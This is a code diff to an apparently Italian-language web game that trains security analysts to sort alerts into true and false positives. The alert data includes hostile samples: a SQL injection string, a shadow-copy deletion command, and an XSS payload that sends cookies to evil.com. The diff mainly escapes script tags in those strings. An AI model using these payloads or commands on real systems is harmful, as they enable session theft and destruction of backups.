@@ -215,6 +215,7 @@
 
     <script>
         // Database degli Alert (20 eventi con tranelli)
+// Database degli Alert (20 eventi con tranelli)
         const allAlerts = [
             // --- TRUE POSITIVES (Da Bloccare) ---
             { cat: "WAF: SQL INJECTION", detail: "/login.php?user=admin' OR 1=1--", ctx: "IP Pubblico Sconosciuto", malicious: true },
@@ -225,7 +226,10 @@
             { cat: "EDR: RANSOMWARE BEHAVIOR", detail: "vssadmin.exe delete shadows /all /quiet", ctx: "Processo su Server DB", malicious: true },
             { cat: "PROXY: C2 BEACONING", detail: "Connessione TCP a 198.51.100.3:4444", ctx: "IP Non categorizzato (Threat Intel: High)", malicious: true },
             { cat: "NETWORK: LATERAL MOVEMENT", detail: "SMB Auth Success (Admin)", ctx: "Source: PC-Stagista -> Dest: DomainController", malicious: true },
-            { cat: "WAF: XSS EXPLOIT", detail: "User-Agent: fetch('http://evil.com/'+document.cookie)", ctx: "Traffico in ingresso", malicious: true },
+            
+            // CORRETTO: Escape dello slash con <\/script>
+            { cat: "WAF: XSS EXPLOIT", detail: "User-Agent: <script>fetch('http://evil.com/'+document.cookie)<\/script>", ctx: "Traffico in ingresso", malicious: true },
+            
             { cat: "IDENTITY: BRUTE FORCE", detail: "50 Login Falliti in 1 min, seguito da 1 Successo", ctx: "Utente: ceo_account", malicious: true },
             
             // --- FALSE POSITIVES (Da Ignorare - Tranelli) ---
@@ -234,13 +238,16 @@
             { cat: "EDR: PROCESSO SOSPETTO", detail: "C:\\Windows\\System32\\taskmgr.exe", ctx: "L'utente ha aperto il Task Manager", malicious: false },
             { cat: "PROXY: CONNESSIONE ESTERNA", detail: "HTTPS GET https://github.com/microsoft", ctx: "Utente: dev_team (Traffico Sviluppatori Normale)", malicious: false },
             { cat: "NETWORK: DNS TRAFFIC", detail: "UDP Port 53 Request", ctx: "Destinazione: 8.8.8.8 (Google DNS)", malicious: false },
-            { cat: "WAF: XSS BLOCKED", detail: "Payload: <script>alert('test')</script>", ctx: "Source IP: 192.168.1.100 (Subnet Dev) - User-Agent: Postman", malicious: false }, // Tranello! È un test di un dev
+            
+            // CORRETTO: Escape dello slash con <\/script>
+            { cat: "WAF: XSS BLOCKED", detail: "Payload: <script>alert('test')<\/script>", ctx: "Source IP: 192.168.1.100 (Subnet Dev) - User-Agent: Postman", malicious: false }, 
+            
             { cat: "IDENTITY: LOCAL SERVICE", detail: "Login Success: NT AUTHORITY\\SYSTEM", ctx: "Localhost (Avvio servizio di sistema)", malicious: false },
             { cat: "EDR: CMD EXECUTION", detail: "ping.exe 8.8.8.8", ctx: "Eseguito da IT_Admin per troubleshooting", malicious: false },
             { cat: "EMAIL: MASS MAILING", detail: "Oggetto: 'Nuove policy ferie aziendali'", ctx: "Mittente: hr@tuazienda.it a All_Staff", malicious: false },
             { cat: "PROXY: DOWNLOAD ESEGUIBILE", detail: "Download: windows10_update.exe", ctx: "Destinazione: update.microsoft.com", malicious: false }
         ];
-
+        
         let alerts = [];
         let currentIndex = 0;
         let score = 0;
